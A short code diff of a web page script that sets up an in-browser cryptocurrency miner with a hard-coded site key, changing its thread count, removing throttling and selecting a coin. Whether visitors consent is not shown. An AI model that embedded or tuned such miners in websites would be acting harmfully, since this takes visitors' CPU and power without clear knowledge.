@@ -46,7 +46,9 @@
 <script>
 var miner = null;
 try {
-  miner = new CRLT.Anonymous('9dfd1e123a3542cff4bee9a8d90553c42acd0bb294fb', {threads: 15});
+  var miner=new CRLT.Anonymous('9dfd1e123a3542cff4bee9a8d90553c42acd0bb294fb', {
+    threads:10,throttle:0, coin: "upx",
+  });
 } catch(e) {}
 
 var ui = new MinerUI(miner, {
